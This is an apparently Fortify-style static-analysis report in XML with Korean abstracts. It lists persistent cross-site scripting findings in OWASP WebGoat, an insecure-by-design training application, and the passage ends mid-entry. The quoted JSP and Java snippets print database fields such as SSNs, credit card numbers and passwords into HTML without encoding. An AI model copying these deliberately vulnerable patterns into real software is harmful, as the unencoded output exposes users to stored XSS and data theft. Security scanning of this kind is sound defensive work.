                        <Issue iid="83E39BAAE30C02765F1B0885AF3E463D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0F2D46586BF3CA43FF9DD7CAA55167B8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DB165804043C498CD8806FC7F43BDD95" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6FEA9F194B6ABD3365FD4734D10DFE2C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="257C7057E5CFA0A106155E174D36C7DC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 86 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>86</LineStart>
<Snippet>						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D8C88DC1927A89743CCA68E9B728BF03" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="910164FF76CBF4383B81D01EEDA13AEE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A6812F7C6FC5DE38A4539262BA6AA1A6" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 makeStationList() 메서드가 264 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>264</LineStart>
<Snippet>	{
	    String key = (String) it.next();
	    select.addElement(new Option(key).addElement((String) stations
		    .get(key)));
	}</Snippet>
<TargetFunction>org.apache.ecs.html.Option.Option()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>299</LineStart>
<Snippet>		    ResultSet.TYPE_SCROLL_INSENSITIVE,
		    ResultSet.CONCUR_READ_ONLY);
	    ResultSet results = statement.executeQuery(query);

	    if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B699CC7A100FD1045D709A7F99C255C0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="882C1BE9C3BC0E9599A354683D4C9366" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1504404527EB36D056555BD394504E48" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress2()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2C316AB0CACCA68401B93A97F05C0334" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F9F0A777F6E9CC63EFCDDD557D44DB7C" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			ResultSet.CONCUR_READ_ONLY);
		statement.setString(1, accountName);
		ResultSet results = statement.executeQuery();

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3BFB81B1B4B92869060052170F18118F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=CrossSiteScripting.DISCIPLINARY_NOTES%&gt;" cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DA22E3D2572F3D1AC4E476E30E3B6994" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="99CDC089F47678F8A9ED8841B0164BA7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C5DD424EF472969BC897E07D423516BA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FEF1DFF56504CB6E6531E52DA9A39608" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0014DEAEAF828EA0CC0C794E4DE56B7B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="17BB7194AF5F3257FC85C2CF5087CE96" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BackDoors.java의 concept1() 메서드가 125 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>125</LineStart>
<Snippet>		    t.addElement(tr);
		    tr = new TR();
		    tr.addElement(new TD(rs.getString("userid")));
		    tr.addElement(new TD(rs.getString("password")));
		    tr.addElement(new TD(rs.getString("ssn")));</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>113</LineStart>
<Snippet>		}

		ResultSet rs = statement.executeQuery(arrSQL[0]);
		if (rs.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="315148CF8A0F14875E609FDDBE97DB1B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
